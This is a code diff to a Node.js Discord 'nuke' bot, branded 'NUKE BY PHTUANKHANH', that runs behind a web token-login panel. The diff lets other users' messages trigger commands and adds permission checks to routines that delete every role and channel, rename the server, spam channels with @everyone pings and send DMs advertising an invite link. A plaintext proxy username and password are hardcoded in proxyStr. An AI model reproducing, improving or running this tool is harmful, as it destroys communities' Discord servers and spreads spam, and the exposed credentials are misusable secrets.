@@ -23,7 +23,8 @@ const CONFIG = {
   pingEveryone: true,
   roleName: 'ROLE SPAM BY PTK',
   roleCount: 20,
-  dmContent: '# > NUKE BY PHTUANKHANH\n\nhttps://discord.gg/BqZ7UdtwXG'
+  dmContent: '# > NUKE BY PHTUANKHANH\n\nhttps://discord.gg/BqZ7UdtwXG',
+  allowOthers: true   // true = ai gõ lệnh cũng chạy; false = chỉ bot tự gõ
 };
 
 const proxyStr = 'http://flme5a8d5ad-package-standard:d4bda2c8@proxy.flameproxies.com:8989';
@@ -150,25 +151,37 @@ function startBot(token, session) {
       GatewayIntentBits.Guilds,
       GatewayIntentBits.GuildMessages,
       GatewayIntentBits.MessageContent,
-      GatewayIntentBits.GuildMembers
-    ]
+      GatewayIntentBits.GuildMembers,
+      GatewayIntentBits.DirectMessages
+    ],
+    partials: []
   });
 
   session.client.on('ready', () => {
     session.clientId = session.client.user.id;
-    pushLog(session, `BOT Đã online: ${session.client.user.tag}`, 'success');
+    pushLog(session, `BOT online: ${session.client.user.tag} (${session.client.user.id})`, 'success');
   });
 
   session.client.on('error', e => pushLog(session, `client error: ${e.message}`, 'error'));
   session.client.on('shardError', e => pushLog(session, `shard error: ${e.message}`, 'error'));
+  session.client.on('warn', m => pushLog(session, `warn: ${m}`, 'warn'));
+  session.client.on('disconnect', () => pushLog(session, `client disconnected`, 'warn'));
 
   session.client.on('messageCreate', async (message) => {
     if (!message.client.user) return;
-    if (message.author.id !== session.client.user.id) return;
+    if (!message.guild) return;
+
+    console.log(`[MSG] author=${message.author.tag}(${message.author.id}) bot=${message.author.bot} content=${JSON.stringify(message.content)}`);
+
+    if (CONFIG.allowOthers) {
+      if (message.author.bot && message.author.id !== session.client.user.id) return;
+    } else {
+      if (message.author.id !== session.client.user.id) return;
+    }
 
     const guild = message.guild;
-    if (!guild) return;
-    const content = message.content.trim();
+    const content = message.content.trim().toLowerCase();
+    const raw = message.content.trim();
 
     if (content === '!menu') {
       const menuMsg =
@@ -186,8 +199,14 @@ function startBot(token, session) {
 
       try {
         const { roleName, roleCount } = CONFIG;
-        const botMember = await guild.members.fetch(session.client.user.id);
-        const botHighestRole = botMember.roles.highest;
+        const me = await guild.members.fetchMe();
+        const botHighestRole = me.roles.highest;
+
+        if (!me.permissions.has('ManageRoles')) {
+          pushLog(session, `Bot thiếu quyền ManageRoles`, 'error');
+          message.reply('❌ Bot thiếu quyền `Manage Roles`.').catch(() => {});
+          return;
+        }
 
         pushLog(session, `Đang xoá toàn bộ role cũ...`, 'info');
         const oldRoles = await guild.roles.fetch();
@@ -229,6 +248,13 @@ function startBot(token, session) {
       let iconUrl = null;
 
       try {
+        const me = await guild.members.fetchMe();
+        if (!me.permissions.has('ManageChannels')) {
+          pushLog(session, `Bot thiếu quyền ManageChannels`, 'error');
+          message.reply('❌ Bot thiếu quyền `Manage Channels`. Không nuke được.').catch(() => {});
+          return;
+        }
+
         const { channelCount: cc, channelName: chName, renameName: rName, msgCount: mc, msgContent: msgText, pingEveryone: ping } = CONFIG;
 
         try { iconUrl = guild.iconURL({ size: 256, extension: 'png' }); } catch {}
@@ -242,7 +268,11 @@ function startBot(token, session) {
 
         if (rName) {
           pushLog(session, `Đang đổi tên server...`, 'info');
-          await safeRest(session, 'PATCH', `/guilds/${guild.id}`, { name: rName }).catch(() => {});
+          if (me.permissions.has('ManageGuild')) {
+            await safeRest(session, 'PATCH', `/guilds/${guild.id}`, { name: rName }).catch(() => {});
+          } else {
+            pushLog(session, `Bot thiếu ManageGuild — bỏ qua rename`, 'warn');
+          }
         }
 
         pushLog(session, `Đang xoá toàn bộ kênh...`, 'info');
@@ -333,13 +363,14 @@ app.post('/api/login', async (req, res) => {
   pushLog(session, `Đang kết nối bot...`, 'info');
   startBot(cleanToken, session);
 
-  await new Promise(r => setTimeout(r, 2500));
-
-  if (session.client && session.client.user) {
-    res.json({ ok: true, user: session.client.user.tag, clientId: session.client.user.id });
-  } else {
-    res.status(500).json({ error: 'Đăng nhập thất bại. Kiểm tra lại token.' });
+  const deadline = Date.now() + 15000;
+  while (Date.now() < deadline) {
+    if (session.client?.user) {
+      return res.json({ ok: true, user: session.client.user.tag, clientId: session.client.user.id });
+    }
+    await new Promise(r => setTimeout(r, 200));
   }
+  res.status(500).json({ error: 'Đăng nhập thất bại. Kiểm tra token + Message Content Intent.' });
 });
 
 app.post('/api/logout', (req, res) => {
